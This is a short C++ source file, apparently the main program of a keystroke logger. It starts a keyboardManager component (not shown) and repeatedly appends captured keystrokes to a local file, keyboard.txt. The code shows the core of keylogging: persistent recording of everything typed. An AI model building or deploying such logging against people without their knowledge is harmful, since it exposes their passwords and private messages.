// logKeyboard.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "pch.h"
#include <iostream>
#include <fstream> 
#include <csignal>
#include "keyboardManager.cpp"

ThreadSafeQueue<string> keyboardManager::keyQueue;
int keyboardManager::logFlag = 0;

keyboardManager* a=nullptr;
int flag=1;


void out() {
	
	string tmp = "";
	
	while (flag) {
		if (a->keyQueue.size() > 0) {
			if (a->keyQueue.try_pop(tmp)) {
				ofstream ofresult("keyboard.txt", ios::app);
				ofresult << tmp ;
				//cout << tmp<<endl;
				ofresult.close();
			}
			Sleep(1000);
		}
	}
}

int main()
{
	flag = 1;
	a = new keyboardManager();

	a->start();
	out();
}

